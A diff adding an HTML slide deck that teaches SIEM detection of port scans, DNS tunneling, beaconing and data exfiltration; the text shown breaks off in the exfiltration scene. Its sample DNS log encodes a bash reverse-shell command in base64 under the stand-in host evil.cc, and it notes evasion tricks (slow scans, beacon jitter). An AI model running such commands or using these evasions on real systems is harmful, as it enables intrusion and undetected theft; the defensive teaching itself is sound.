@@ -1,0 +1,808 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Traffic Patterns</title>
+<link href="https://fonts.googleapis.com/css2?family=Press+Start+2P&display=swap" rel="stylesheet">
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+html,body{background:#0a0a0f;font-family:'Press Start 2P',monospace;width:100%;min-height:100vh;display:flex;flex-direction:column;align-items:center;color:#fff;overflow-x:hidden}
+.scene{width:390px;min-height:100vh;display:none;flex-direction:column}
+.scene.active{display:flex}
+.hdr{height:90px;flex-shrink:0;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:8px;padding:0 14px;border-bottom:1px solid #2a1f3d}
+.hdr-title{font-size:12px;color:#4ec9e1;text-align:center;letter-spacing:.5px;line-height:1.5}
+.hdr-sub{font-size:9px;color:#666;text-align:center;letter-spacing:1px;line-height:1.5}
+.dots{display:flex;gap:8px}
+.dot{width:11px;height:11px;border-radius:50%;background:#2a1f3d;transition:background .2s}
+.dot.active{background:#4ec9e1}.dot.done{background:#4eff9a}
+.slr{height:28px;flex-shrink:0;display:flex;align-items:center;justify-content:space-between;padding:0 14px}
+.slabel{font-size:9px;letter-spacing:1px}
+.sbadge{font-size:7px;padding:3px 8px;border:1px solid currentColor;border-radius:2px}
+.anim{flex:1;overflow-y:auto;overflow-x:hidden;scrollbar-width:none;-ms-overflow-style:none}
+.anim::-webkit-scrollbar{display:none}
+.info{height:110px;flex-shrink:0;margin:0 12px;border:2px solid #4ec9e1;padding:10px 14px;display:flex;flex-direction:column;justify-content:center;gap:7px;font-size:9px;line-height:1.9}
+.info.am{border-color:#e8a020}.info.rd{border-color:#e85050}.info.gn{border-color:#4eff9a}.info.pu{border-color:#a080ff}
+.il{color:#ccc}.ih{color:#4eff9a}.ih.am{color:#e8a020}.ih.rd{color:#e85050}.ih.pu{color:#a080ff}
+.srow{height:70px;flex-shrink:0;display:flex;gap:8px;padding:8px 12px}
+.sc{flex:1;background:#130d1e;border:1px solid #2a1f3d;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:4px}
+.sv{font-size:11px;color:#4ec9e1;text-align:center}
+.sv.am{color:#e8a020}.sv.gn{color:#4eff9a}.sv.rd{color:#e85050}.sv.pu{color:#a080ff}
+.sl{font-size:7px;color:#777;text-align:center;line-height:1.4}
+.ctrl{height:68px;flex-shrink:0;display:flex;align-items:center;justify-content:center;gap:10px;padding:0 12px}
+.btn{font-family:'Press Start 2P',monospace;font-size:9px;padding:10px 14px;border:2px solid #4ec9e1;background:transparent;color:#4ec9e1;cursor:pointer;transition:all .15s}
+.btn:hover{background:#4ec9e130}.btn:active{transform:scale(.97)}
+.btn.play{border-color:#4eff9a;color:#4eff9a}.btn.play:hover{background:#4eff9a20}
+.btn:disabled{opacity:.3;cursor:default}
+.panel{opacity:0;transition:opacity .4s;border-radius:2px;padding:9px 10px}
+.panel.vis{opacity:1}
+@keyframes blink{0%,100%{opacity:1}50%{opacity:.3}}
+@keyframes alertPulse{0%,100%{box-shadow:0 0 4px #e85050}50%{box-shadow:0 0 14px #e85050,0 0 24px #e85050}}
+.alert-glow{animation:alertPulse .8s ease infinite}
+</style>
+</head>
+<body>
+
+<!-- ═══ SCENE 1: HOOK ═══ -->
+<div class="scene active" id="s1" style="background:#0a000f">
+  <div class="hdr" style="background:#0a000f;border-bottom:1px solid #2a0f3d">
+    <div class="hdr-title" style="color:#e060ff">TRAFFIC ANOMALIES</div>
+    <div class="hdr-sub">5 PATTERNS THAT SCREAM BREACH</div>
+    <div class="dots">
+      <div class="dot active"></div><div class="dot"></div><div class="dot"></div>
+      <div class="dot"></div><div class="dot"></div><div class="dot"></div>
+    </div>
+  </div>
+  <div class="slr" style="background:#0a000f">
+    <span class="slabel" style="color:#e060ff">HOOK</span>
+    <span class="sbadge" style="color:#e85050;border-color:#e85050">DETECTION</span>
+  </div>
+  <div class="anim" style="background:#0a000f">
+    <div style="padding:10px 12px 14px;display:flex;flex-direction:column;gap:9px">
+
+      <!-- SIEM DASHBOARD MOCKUP -->
+      <div style="background:#06000e;border:2px solid #3a1050;border-radius:3px;overflow:hidden">
+        <div style="background:#12083a;padding:6px 10px;display:flex;align-items:center;justify-content:space-between">
+          <div style="font-size:7px;color:#a080ff">SIEM ALERT CONSOLE</div>
+          <div style="font-size:7px;color:#e85050;animation:blink 1s infinite" id="siem_blink">● LIVE</div>
+        </div>
+        <div style="padding:8px 10px;display:flex;flex-direction:column;gap:4px">
+          <div class="panel" id="h_a1" style="display:flex;align-items:center;gap:8px;padding:5px 8px;background:#1a0008;border:1px solid #e85050;border-radius:2px">
+            <div style="font-size:14px;flex-shrink:0">🔴</div>
+            <div style="flex:1"><div style="font-size:6.5px;color:#e85050">CRITICAL</div><div style="font-size:6px;color:#888;margin-top:2px;line-height:1.7">PORT SCAN — 192.168.1.44 → 1,024 ports/60s</div></div>
+            <div style="font-size:6px;color:#666">00:03:12</div>
+          </div>
+          <div class="panel" id="h_a2" style="display:flex;align-items:center;gap:8px;padding:5px 8px;background:#1a0800;border:1px solid #e8a020;border-radius:2px">
+            <div style="font-size:14px;flex-shrink:0">🟠</div>
+            <div style="flex:1"><div style="font-size:6.5px;color:#e8a020">HIGH</div><div style="font-size:6px;color:#888;margin-top:2px;line-height:1.7">DNS TUNNEL — query len 87 chars, TXT flood</div></div>
+            <div style="font-size:6px;color:#666">00:07:44</div>
+          </div>
+          <div class="panel" id="h_a3" style="display:flex;align-items:center;gap:8px;padding:5px 8px;background:#1a0800;border:1px solid #e8a020;border-radius:2px">
+            <div style="font-size:14px;flex-shrink:0">🟠</div>
+            <div style="flex:1"><div style="font-size:6.5px;color:#e8a020">HIGH</div><div style="font-size:6px;color:#888;margin-top:2px;line-height:1.7">BEACON — 60s interval × 48 hits → 5.45.99.12</div></div>
+            <div style="font-size:6px;color:#666">00:51:00</div>
+          </div>
+          <div class="panel" id="h_a4" style="display:flex;align-items:center;gap:8px;padding:5px 8px;background:#1a0008;border:1px solid #e85050;border-radius:2px">
+            <div style="font-size:14px;flex-shrink:0">🔴</div>
+            <div style="flex:1"><div style="font-size:6.5px;color:#e85050">CRITICAL</div><div style="font-size:6px;color:#888;margin-top:2px;line-height:1.7">EXFIL — 4.2 GB upload 02:14 → unknown IP</div></div>
+            <div style="font-size:6px;color:#666">02:14:08</div>
+          </div>
+          <div class="panel" id="h_a5" style="display:flex;align-items:center;gap:8px;padding:5px 8px;background:#1a0008;border:1px solid #e85050;border-radius:2px">
+            <div style="font-size:14px;flex-shrink:0">🔴</div>
+            <div style="flex:1"><div style="font-size:6.5px;color:#e85050">CRITICAL</div><div style="font-size:6px;color:#888;margin-top:2px;line-height:1.7">LATERAL MOVE — creds used 14 hosts/90s SMB</div></div>
+            <div style="font-size:6px;color:#666">02:19:33</div>
+          </div>
+        </div>
+      </div>
+
+      <!-- QUOTE -->
+      <div class="panel" id="h_quote" style="background:#08000e;border:2px solid #e060ff">
+        <div style="font-size:7px;color:#e060ff;margin-bottom:5px">💬 THE DEFENDER MINDSET</div>
+        <div style="font-size:7px;color:#ddd;line-height:2">"Defenders look for exactly 5 traffic patterns — here's what they are and why they work."</div>
+      </div>
+
+    </div>
+  </div>
+  <div class="info rd" style="margin:0 12px">
+    <div class="il">Every breach leaves a traffic signature.</div>
+    <div class="ih rd">SIEM rules fire on these 5 canonical patterns.</div>
+  </div>
+  <div class="srow">
+    <div class="sc"><div class="sv rd">5</div><div class="sl">PATTERNS</div></div>
+    <div class="sc"><div class="sv am">SIEM</div><div class="sl">DETECTION</div></div>
+    <div class="sc"><div class="sv" style="color:#e060ff">OPSEC</div><div class="sl">RED + BLUE</div></div>
+  </div>
+  <div class="ctrl">
+    <button class="btn" disabled>◀ PREV</button>
+    <button class="btn play" onclick="play(1)">▶ PLAY</button>
+    <button class="btn" onclick="go(2)">NEXT ▶</button>
+  </div>
+</div>
+
+<!-- ═══ SCENE 2: PORT SCAN ═══ -->
+<div class="scene" id="s2" style="background:#100005">
+  <div class="hdr" style="background:#100005;border-bottom:1px solid #300010">
+    <div class="hdr-title" style="color:#e85050">PATTERN 1: PORT SCAN</div>
+    <div class="hdr-sub">ONE SRC → MANY PORTS → SHORT TIME</div>
+    <div class="dots">
+      <div class="dot done"></div><div class="dot active"></div><div class="dot"></div>
+      <div class="dot"></div><div class="dot"></div><div class="dot"></div>
+    </div>
+  </div>
+  <div class="slr" style="background:#100005">
+    <span class="slabel" style="color:#e85050">PORT SCAN</span>
+    <span class="sbadge" style="color:#e85050;border-color:#e85050">RECON</span>
+  </div>
+  <div class="anim" style="background:#100005">
+    <div style="padding:10px 12px 14px;display:flex;flex-direction:column;gap:8px">
+
+      <!-- PORT SCAN BURST GRAPH -->
+      <div style="background:#080003;border:2px solid #300010;border-radius:3px;padding:10px 10px 8px">
+        <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px">
+          <div style="font-size:7px;color:#e85050">CONNECTIONS / SECOND</div>
+          <div id="ps_alert" style="font-size:6.5px;color:#e85050;padding:2px 6px;border:1px solid #e85050;border-radius:2px;opacity:0;transition:opacity .3s">⚠ ALERT FIRED</div>
+        </div>
+        <!-- Graph area -->
+        <div style="position:relative;height:90px;background:#040001;border:1px solid #1a0008">
+          <!-- Y axis labels -->
+          <div style="position:absolute;left:2px;top:4px;font-size:5.5px;color:#444">1k</div>
+          <div style="position:absolute;left:2px;top:28px;font-size:5.5px;color:#444">500</div>
+          <div style="position:absolute;left:2px;bottom:4px;font-size:5.5px;color:#444">0</div>
+          <!-- Baseline bars (normal) -->
+          <div style="position:absolute;bottom:0;left:18px;right:4px;height:100%;display:flex;align-items:flex-end;gap:2px">
+            <!-- Normal traffic bars -->
+            <div style="flex:1;background:#1a0008;height:4px;border-radius:1px 1px 0 0"></div>
+            <div style="flex:1;background:#1a0008;height:6px;border-radius:1px 1px 0 0"></div>
+            <div style="flex:1;background:#1a0008;height:3px;border-radius:1px 1px 0 0"></div>
+            <div style="flex:1;background:#1a0008;height:5px;border-radius:1px 1px 0 0"></div>
+            <div style="flex:1;background:#1a0008;height:4px;border-radius:1px 1px 0 0"></div>
+            <div style="flex:1;background:#1a0008;height:7px;border-radius:1px 1px 0 0"></div>
+            <!-- SCAN BURST - bars animate from 0 up -->
+            <div id="ps_b1" style="flex:1;background:#e85050;height:0;border-radius:1px 1px 0 0;transition:height .15s ease;box-shadow:0 0 4px #e85050"></div>
+            <div id="ps_b2" style="flex:1;background:#e85050;height:0;border-radius:1px 1px 0 0;transition:height .15s ease .05s;box-shadow:0 0 4px #e85050"></div>
+            <div id="ps_b3" style="flex:1;background:#ff4060;height:0;border-radius:1px 1px 0 0;transition:height .2s ease .1s;box-shadow:0 0 6px #ff4060"></div>
+            <div id="ps_b4" style="flex:1;background:#ff2040;height:0;border-radius:1px 1px 0 0;transition:height .2s ease .15s;box-shadow:0 0 8px #ff2040"></div>
+            <div id="ps_b5" style="flex:1;background:#ff2040;height:0;border-radius:1px 1px 0 0;transition:height .2s ease .2s;box-shadow:0 0 8px #ff2040"></div>
+            <div id="ps_b6" style="flex:1;background:#e85050;height:0;border-radius:1px 1px 0 0;transition:height .2s ease .25s;box-shadow:0 0 6px #e85050"></div>
+            <div id="ps_b7" style="flex:1;background:#c04040;height:0;border-radius:1px 1px 0 0;transition:height .15s ease .3s;box-shadow:0 0 4px #c04040"></div>
+            <!-- Back to normal -->
+            <div style="flex:1;background:#1a0008;height:5px;border-radius:1px 1px 0 0"></div>
+            <div style="flex:1;background:#1a0008;height:3px;border-radius:1px 1px 0 0"></div>
+            <div style="flex:1;background:#1a0008;height:6px;border-radius:1px 1px 0 0"></div>
+          </div>
+          <!-- Threshold line -->
+          <div id="ps_thresh" style="position:absolute;left:18px;right:4px;top:14px;height:1px;background:#e8a020;opacity:0;transition:opacity .3s">
+            <span style="position:absolute;right:2px;top:-9px;font-size:5.5px;color:#e8a020;font-family:'Press Start 2P',monospace">THRESHOLD</span>
+          </div>
+        </div>
+        <div style="display:flex;justify-content:space-between;margin-top:4px;font-size:5.5px;color:#444;padding:0 18px 0 18px">
+          <span>T-6s</span><span>T-3s</span><span style="color:#e85050">SCAN</span><span>T+3s</span>
+        </div>
+      </div>
+
+      <!-- SIEM RULE -->
+      <div class="panel" id="ps_rule" style="background:#080003;border:1px solid #300010">
+        <div style="font-size:7px;color:#e85050;margin-bottom:7px">SIEM DETECTION RULE</div>
+        <div style="background:#040001;padding:8px;font-size:6.5px;line-height:2;border:1px solid #200008;border-radius:2px">
+          <div style="color:#888">SELECT src_ip, COUNT(DISTINCT dst_port)</div>
+          <div style="color:#888">FROM traffic</div>
+          <div style="color:#888">WHERE time_window = <span style="color:#e8a020">60s</span></div>
+          <div style="color:#e85050">HAVING port_count &gt; <span style="color:#ff6060">100</span></div>
+          <div style="color:#4eff9a">→ ALERT: port_scan</div>
+        </div>
+      </div>
+
+      <!-- SCAN TYPES -->
+      <div class="panel" id="ps_types" style="background:#080003;border:1px solid #300010">
+        <div style="font-size:7px;color:#e85050;margin-bottom:7px">SCAN SIGNATURES</div>
+        <div style="display:grid;grid-template-columns:1fr 1fr;gap:5px">
+          <div style="padding:5px 7px;background:#0d0002;border-left:2px solid #e85050">
+            <div style="font-size:6.5px;color:#e85050">SYN SCAN</div>
+            <div style="font-size:6px;color:#666;line-height:1.7;margin-top:2px">Half-open, no ACK. Fast, stealthy.</div>
+          </div>
+          <div style="padding:5px 7px;background:#0d0002;border-left:2px solid #e8a020">
+            <div style="font-size:6.5px;color:#e8a020">UDP SCAN</div>
+            <div style="font-size:6px;color:#666;line-height:1.7;margin-top:2px">ICMP unreachable = port closed.</div>
+          </div>
+          <div style="padding:5px 7px;background:#0d0002;border-left:2px solid #a080ff;grid-column:1/-1">
+            <div style="font-size:6.5px;color:#a080ff">SLOW SCAN (OPSEC)</div>
+            <div style="font-size:6px;color:#666;line-height:1.7;margin-top:2px">1 port/min to stay under threshold. Takes hours but evades rate rules.</div>
+          </div>
+        </div>
+      </div>
+
+    </div>
+  </div>
+  <div class="info rd" style="margin:0 12px">
+    <div class="il">Same src IP → many dst ports → short window.</div>
+    <div class="ih rd">&gt;100 ports in 60s = SIEM fires immediately.</div>
+  </div>
+  <div class="srow">
+    <div class="sc"><div class="sv rd">1024</div><div class="sl">PORTS/MIN</div></div>
+    <div class="sc"><div class="sv am">SYN</div><div class="sl">HALF-OPEN</div></div>
+    <div class="sc"><div class="sv" style="color:#a080ff">SLOW</div><div class="sl">EVASION</div></div>
+  </div>
+  <div class="ctrl">
+    <button class="btn" onclick="go(1)">◀ PREV</button>
+    <button class="btn play" onclick="play(2)">▶ PLAY</button>
+    <button class="btn" onclick="go(3)">NEXT ▶</button>
+  </div>
+</div>
+
+<!-- ═══ SCENE 3: DNS TUNNELING ═══ -->
+<div class="scene" id="s3" style="background:#000d18">
+  <div class="hdr" style="background:#000d18;border-bottom:1px solid #0d2838">
+    <div class="hdr-title" style="color:#4ec9e1">PATTERN 2: DNS TUNNEL</div>
+    <div class="hdr-sub">DATA HIDDEN IN DNS QUERIES</div>
+    <div class="dots">
+      <div class="dot done"></div><div class="dot done"></div><div class="dot active"></div>
+      <div class="dot"></div><div class="dot"></div><div class="dot"></div>
+    </div>
+  </div>
+  <div class="slr" style="background:#000d18">
+    <span class="slabel" style="color:#4ec9e1">DNS TUNNEL</span>
+    <span class="sbadge" style="color:#e8a020;border-color:#e8a020">C2 / EXFIL</span>
+  </div>
+  <div class="anim" style="background:#000d18">
+    <div style="padding:10px 12px 14px;display:flex;flex-direction:column;gap:8px">
+
+      <!-- DNS QUERY LOG REVEAL -->
+      <div style="background:#000810;border:2px solid #0d2838;border-radius:3px;overflow:hidden">
+        <div style="background:#001428;padding:5px 10px;display:flex;justify-content:space-between;align-items:center">
+          <div style="font-size:6.5px;color:#4ec9e1">DNS RESOLVER LOG</div>
+          <div id="dns_alert" style="font-size:6px;color:#e85050;padding:2px 5px;border:1px solid #e85050;opacity:0;transition:opacity .3s">⚠ ANOMALY</div>
+        </div>
+        <div style="padding:8px 10px;font-size:6px;line-height:2.2;background:#000508">
+          <!-- Normal queries -->
+          <div id="dns_r0" style="color:#2a5040;opacity:0;transition:opacity .25s">▷ A google.com → 142.250.80.46</div>
+          <div id="dns_r1" style="color:#2a5040;opacity:0;transition:opacity .25s">▷ A github.com → 140.82.112.4</div>
+          <!-- Suspicious -->
+          <div id="dns_r2" style="opacity:0;transition:opacity .25s;display:flex;align-items:baseline;gap:4px">
+            <span style="color:#e8a020">▷ TXT</span>
+            <span style="color:#ff8040;word-break:break-all">aGVsbG8td29ybGQtdGhpcy1pcy1leGZpbC1kYXRh.evil.cc</span>
+          </div>
+          <div id="dns_r3" style="opacity:0;transition:opacity .25s;display:flex;align-items:baseline;gap:4px">
+            <span style="color:#e8a020">▷ TXT</span>
+            <span style="color:#ff8040;word-break:break-all">Y21kPWV4ZWMgL2Jpbi9iYXNoIC1pID4mIC9kZXYv.evil.cc</span>
+          </div>
+          <div id="dns_r4" style="opacity:0;transition:opacity .25s;display:flex;align-items:baseline;gap:4px">
+            <span style="color:#e8a020">▷ TXT</span>
+            <span style="color:#ff8040;word-break:break-all">dGNwLzE5Mi4xNjguMS4xLzQ0NDQgMD4mMQ==.evil.cc</span>
+          </div>
+          <div id="dns_r5" style="color:#555;font-size:5.5px;opacity:0;transition:opacity .25s;margin-top:2px">↑ BASE64 ENCODED — DECODED: exec /bin/bash reverse shell</div>
+        </div>
+      </div>
+
+      <!-- DETECTION SIGNALS -->
+      <div class="panel" id="dns_signals" style="background:#000810;border:1px solid #0d2838">
+        <div style="font-size:7px;color:#4ec9e1;margin-bottom:8px">SIEM TRIGGER CONDITIONS</div>
+        <div style="display:flex;flex-direction:column;gap:5px">
+          <div style="display:flex;align-items:center;gap:8px;padding:5px 8px;background:#000d1a;border-left:2px solid #e85050">
+            <div style="font-size:14px;flex-shrink:0">📏</div>
+            <div><div style="font-size:6.5px;color:#e85050">QUERY LENGTH &gt; 50 CHARS</div><div style="font-size:6px;color:#666;line-height:1.7;margin-top:2px">Normal FQDNs rarely exceed 30 chars. 80+ = encoded payload.</div></div>
+          </div>
+          <div style="display:flex;align-items:center;gap:8px;padding:5px 8px;background:#000d1a;border-left:2px solid #e8a020">
+            <div style="font-size:14px;flex-shrink:0">📊</div>
+            <div><div style="font-size:6.5px;color:#e8a020">HIGH TXT QUERY VOLUME</div><div style="font-size:6px;color:#666;line-height:1.7;margin-top:2px">TXT records rarely queried in prod. Spike = tunnel.</div></div>
+          </div>
+          <div style="display:flex;align-items:center;gap:8px;padding:5px 8px;background:#000d1a;border-left:2px solid #4eff9a">
+            <div style="font-size:14px;flex-shrink:0">🆕</div>
+            <div><div style="font-size:6.5px;color:#4eff9a">NEW / RARE DOMAIN</div><div style="font-size:6px;color:#666;line-height:1.7;margin-top:2px">First-seen domain + base64 pattern = C2 indicator.</div></div>
+          </div>
+        </div>
+      </div>
+
+    </div>
+  </div>
+  <div class="info" style="margin:0 12px;border-color:#4ec9e1">
+    <div class="il">DNS queries &gt;50 chars + TXT flood + new domain.</div>
+    <div class="ih">Three signals together = high-confidence tunnel.</div>
+  </div>
+  <div class="srow">
+    <div class="sc"><div class="sv">50+</div><div class="sl">CHARS FLAG</div></div>
+    <div class="sc"><div class="sv am">TXT</div><div class="sl">RECORD TYPE</div></div>
+    <div class="sc"><div class="sv rd">:53</div><div class="sl">BYPASSES FW</div></div>
+  </div>
+  <div class="ctrl">
+    <button class="btn" onclick="go(2)">◀ PREV</button>
+    <button class="btn play" onclick="play(3)">▶ PLAY</button>
+    <button class="btn" onclick="go(4)">NEXT ▶</button>
+  </div>
+</div>
+
+<!-- ═══ SCENE 4: BEACONING ═══ -->
+<div class="scene" id="s4" style="background:#080014">
+  <div class="hdr" style="background:#080014;border-bottom:1px solid #1a0838">
+    <div class="hdr-title" style="color:#a080ff">PATTERN 3: BEACONING</div>
+    <div class="hdr-sub">HEARTBEAT = C2 IMPLANT ALIVE</div>
+    <div class="dots">
+      <div class="dot done"></div><div class="dot done"></div><div class="dot done"></div>
+      <div class="dot active"></div><div class="dot"></div><div class="dot"></div>
+    </div>
+  </div>
+  <div class="slr" style="background:#080014">
+    <span class="slabel" style="color:#a080ff">BEACONING</span>
+    <span class="sbadge" style="color:#a080ff;border-color:#a080ff">C2 IMPLANT</span>
+  </div>
+  <div class="anim" style="background:#080014">
+    <div style="padding:10px 12px 14px;display:flex;flex-direction:column;gap:8px">
+
+      <!-- BEACON HEARTBEAT GRAPH -->
+      <div style="background:#040010;border:2px solid #1a0838;border-radius:3px;padding:10px 10px 8px">
+        <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px">
+          <div style="font-size:7px;color:#a080ff">OUTBOUND CONN TO 5.45.99.12</div>
+          <div id="bc_alert" style="font-size:6px;color:#e85050;padding:2px 5px;border:1px solid #e85050;opacity:0;transition:opacity .3s">⚠ BEACON</div>
+        </div>
+        <!-- Heartbeat waveform -->
+        <div style="position:relative;height:80px;background:#020008;border:1px solid #100830">
+          <div style="position:absolute;left:4px;top:4px;font-size:5.5px;color:#444">BYTES</div>
+          <!-- Horizontal baseline -->
+          <div style="position:absolute;bottom:20px;left:20px;right:4px;height:1px;background:#1a0830"></div>
+          <!-- Regular heartbeat pulses - SVG -->
+          <svg style="position:absolute;top:0;left:20px;width:calc(100% - 24px);height:100%" viewBox="0 0 320 80" preserveAspectRatio="none">
+            <!-- flat line then spikes -->
+            <polyline id="bc_wave" points="0,60 0,60" fill="none" stroke="#a080ff" stroke-width="1.5"/>
+          </svg>
+          <!-- Time label -->
+          <div style="position:absolute;bottom:4px;left:20px;right:4px;display:flex;justify-content:space-between;font-size:5px;color:#333;font-family:'Press Start 2P',monospace">
+            <span>T+0</span><span>T+1m</span><span>T+2m</span><span>T+3m</span><span>T+4m</span>
+          </div>
+        </div>
+        <!-- Interval label -->
+        <div id="bc_interval" style="text-align:center;font-size:7px;color:#a080ff;margin-top:6px;opacity:0;transition:opacity .4s">INTERVAL: 60.0s ± 0.3s → C2</div>
+      </div>
+
+      <!-- JIT EXPLANATION -->
+      <div class="panel" id="bc_why" style="background:#040010;border:1px solid #1a0838">
+        <div style="font-size:7px;color:#a080ff;margin-bottom:7px">WHY REGULARITY BETRAYS C2</div>
+        <div style="display:flex;flex-direction:column;gap:5px">
+          <div style="display:flex;gap:8px;padding:5px 8px;background:#08001a;border-left:2px solid #4eff9a">
+            <span style="font-size:12px;flex-shrink:0">👤</span>
+            <div><div style="font-size:6.5px;color:#4eff9a">HUMAN TRAFFIC</div><div style="font-size:6px;color:#666;line-height:1.7;margin-top:2px">Irregular. Bursty. Gaps for lunch, sleep, weekends.</div></div>
+          </div>
+          <div style="display:flex;gap:8px;padding:5px 8px;background:#08001a;border-left:2px solid #e85050">
+            <span style="font-size:12px;flex-shrink:0">🤖</span>
+            <div><div style="font-size:6.5px;color:#e85050">C2 IMPLANT</div><div style="font-size:6px;color:#666;line-height:1.7;margin-top:2px">Clock-precise. 60.0s every time. Fires at 3am. Std dev &lt;1s.</div></div>
+          </div>
+          <div style="display:flex;gap:8px;padding:5px 8px;background:#08001a;border-left:2px solid #e8a020">
+            <span style="font-size:12px;flex-shrink:0">🎲</span>
+            <div><div style="font-size:6.5px;color:#e8a020">JITTER (OPSEC)</div><div style="font-size:6px;color:#666;line-height:1.7;margin-top:2px">Good implants add ±30% random jitter to hide interval sigma.</div></div>
+          </div>
+        </div>
+      </div>
+
+    </div>
+  </div>
+  <div class="info pu" style="margin:0 12px">
+    <div class="il">Regular interval to same external IP = C2.</div>
+    <div class="ih pu">Humans are messy. Beacons are clock-precise.</div>
+  </div>
+  <div class="srow">
+    <div class="sc"><div class="sv pu">60s</div><div class="sl">INTERVAL</div></div>
+    <div class="sc"><div class="sv rd">&lt;1s</div><div class="sl">STD DEV</div></div>
+    <div class="sc"><div class="sv am">JITTER</div><div class="sl">EVASION</div></div>
+  </div>
+  <div class="ctrl">
+    <button class="btn" onclick="go(3)">◀ PREV</button>
+    <button class="btn play" onclick="play(4)">▶ PLAY</button>
+    <button class="btn" onclick="go(5)">NEXT ▶</button>
+  </div>
+</div>
+
+<!-- ═══ SCENE 5: DATA EXFILTRATION ═══ -->
+<div class="scene" id="s5" style="background:#001200">
+  <div class="hdr" style="background:#001200;border-bottom:1px solid #0d3010">
+    <div class="hdr-title" style="color:#e8a020">PATTERN 4: EXFILTRATION</div>
+    <div class="hdr-sub">LARGE OUTBOUND — WRONG TIME — UNKNOWN DST</div>
+    <div class="dots">
+      <div class="dot done"></div><div class="dot done"></div><div class="dot done"></div>
+      <div class="dot done"></div><div class="dot active"></div><div class="dot"></div>
+    </div>
+  </div>
+  <div class="slr" style="background:#001200">
+    <span class="slabel" style="color:#e8a020">EXFILTRATION</span>
+    <span class="sbadge" style="color:#e85050;border-color:#e85050">DATA THEFT</span>
+  </div>
+  <div class="anim" style="background:#001200">
+    <div style="padding:10px 12px 14px;display:flex;flex-direction:column;gap:8px">
+
+      <!-- OUTBOUND TRAFFIC GRAPH WITH SPIKE -->
+      <div style="background:#000a00;border:2px solid #0d3010;border-radius:3px;padding:10px 10px 8px">
+        <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px">
+          <div style="font-size:7px;color:#e8a020">OUTBOUND BYTES/HOUR</div>
+          <div id="ex_alert" style="font-size:6px;color:#e85050;padding:2px 5px;border:1px solid #e85050;opacity:0;transition:opacity .3s">⚠ EXFIL</div>
+        </div>
+        <div style="position:relative;height:90px;background:#000500;border:1px solid #0a1a08">
+          <div style="position:absolute;left:2px;top:4px;font-size:5.5px;color:#444">4GB</div>
+          <div style="position:absolute;left:2px;top:32px;font-size:5.5px;color:#444">2GB</div>
+          <div style="position:absolute;left:2px;bottom:4px;font-size:5.5px;color:#444">0</div>
+          <!-- Bars in bottom-up style -->
+          <div style="position:absolute;bottom:0;left:20px;right:4px;height:100%;display:flex;align-items:flex-end;gap:2px">
+            <!-- daytime normal -->
+            <div style="flex:1;background:#0d2808;height:8px;border-radius:1px 1px 0 0"></div>
+            <div style="flex:1;background:#0d2808;height:12px;border-radius:1px 1px 0 0"></div>
+            <div style="flex:1;background:#0d2808;height:10px;border-radius:1px 1px 0 0"></div>
+            <div style="flex:1;background:#0d2808;height:15px;border-radius:1px 1px 0 0"></div>
+            <div style="flex:1;background:#0d2808;height:9px;border-radius:1px 1px 0 0"></div>
+            <div style="flex:1;background:#0d2808;height:11px;border-radius:1px 1px 0 0"></div>
+            <!-- midnight spike -->
+            <div id="ex_spike" style="flex:2;background:#e8a020;height:0;border-radius:1px 1px 0 0;transition:height .6s ease;box-shadow:0 0 10px #e8a020"></div>
+            <!-- back to low -->
+            <div style="flex:1;background:#0d2808;height:4px;border-radius:1px 1px 0 0"></div>
+            <div style="flex:1;background:#0d2808;height:3px;border-radius:1px 1px 0 0"></div>
+            <div style="flex:1;background:#0d2808;height:5px;border-radius:1px 1px 0 0"></div>
+          </div>
+          <!-- Threshold line -->
+          <div id="ex_thresh" style="position:absolute;left:20px;right:4px;top:20px;height:1px;background:#e85050;opacity:0;transition:opacity .3s">
+            <span style="position:absolute;right:2px;top:-9px;font-size:5.5px;color:#e85050;font-family:'Press Start 2P',monospace">BASELINE</span>
+          </div>
+        </div>
+        <!-- Time axis -->
+        <div style="display:flex;justify-content:space-between;margin-top:4px;font-size:5.5px;color:#444;padding:0 18px">
+          <span>09:00</span><span>12:00</span><span>15:00</span><span style="color:#e8a020">02:14</span><span>06:00</span>
+        </div>
+      </div>
+
+      <!-- THREE RED FLAGS -->
+      <div class="panel" id="ex_flags" style="background:#000a00;border:1px solid #0d3010">
+        <div style="font-size:7px;color:#e8a020;margin-bottom:8px">3 SIMULTANEOUS RED FLAGS</div>
+        <div style="display:flex;flex-direction:column;gap:5px">
+          <div style="display:flex;align-items:center;gap:8px;padding:5px 8px;background:#0a0800;border-left:2px solid #e85050">
+            <span style="font-size:18px;flex-shrink:0">🕑</span>
+            <div><div style="font-size:6.5px;color:#e85050">OFF-HOURS (02:14)</div><div style="font-size:6px;color:#666;line-height:1.7;margin-top:2px">Bulk upload at 2am when no staff are active.</div></div>
+          </div>
+          <div style="display:flex;align-items:center;gap:8px;padding:5px 8px;background:#0a0800;border-left:2px solid #e8a020">
+            <span style="font-size:18px;flex-shrink:0">📦</span>
+            <div><div style="font-size:6.5px;color:#e8a020">LARGE TRANSFER (4.2 GB)</div><div style="font-size:6px;color:#666;line-height:1.7;margin-top:2px">Far exceeds hourly baseline. Volume anomaly.</div></div>
+          </div>
+          <div style="display:flex;align-items:center;gap:8px;padding:5px 8px;background:#0a0800;border-left:2px solid #4ec9e1">
+            <span style="font-size:18px;flex-shrink:0">🌍</span>
+            <div><div style="font-size:6.5px;color:#4ec9e1">UNKNOWN DESTINATION</div><div style="font-size:6px;color:#666;line-height:1.7;margin-top:2px">IP not in approved geo or allowlist. First-ever connection.</div></div>
+          </div>
+        </div>
+      </div>
+
+    </div>
+  </div>
+  <div class="info am" style="margin:0 12px">
+    <div class="il">Off-hours + large volume + unknown dst IP.</div>
+    <div class="ih am">Any one = yellow. All three at once = critical.</div>
+  </div>
+  <div class="srow">
+    <div class="sc"><div class="sv am">4.2GB</div><div class="sl">SPIKE</div></div>
+    <div class="sc"><div class="sv rd">02:14</div><div class="sl">OFF-HOURS</div></div>
+    <div class="sc"><div class="sv" style="color:#4ec9e1">NEW IP</div><div class="sl">UNKNOWN DST</div></div>
+  </div>
+  <div class="ctrl">
+    <button class="btn" onclick="go(4)">◀ PREV</button>
+    <button class="btn play" onclick="play(5)">▶ PLAY</button>
